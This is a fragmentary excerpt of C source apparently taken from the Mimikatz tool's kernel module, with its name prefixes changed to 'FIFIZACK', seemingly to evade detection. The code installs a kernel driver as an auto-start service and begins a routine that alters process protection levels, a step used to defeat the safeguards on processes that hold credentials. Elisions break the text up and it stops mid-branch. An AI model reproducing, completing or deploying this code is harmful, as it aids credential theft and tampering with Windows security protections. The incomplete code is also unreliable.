...
{
	wchar_t *absFile;
	if(kull_m_file_getAbsolutePathOf(FIFIZACK_DRIVER L".sys", &absFile))
	{
		if(kull_m_file_isFileExist(absFile))
			kull_m_service_install(FIFIZACK_DRIVER, FIFIZACK L" driver (" FIFIZACK_DRIVER L")", absFile, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);
...
{
	kull_m_service_uninstall(FIFIZACK_DRIVER);
	return STATUS_SUCCESS;
}
...
NTSTATUS kuhl_m_kernel_processProtect(int argc, wchar_t * argv[])
{
	...
	if(FIFIZACK_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_VISTA)
	{
		...
		if(protectInfos.processId)
		{
			if(!isUnprotect)
			{
				if(FIFIZACK_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
				{
					protectInfos.SignatureProtection.SignatureLevel = 1;
				}
				else if(FIFIZACK_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
				{
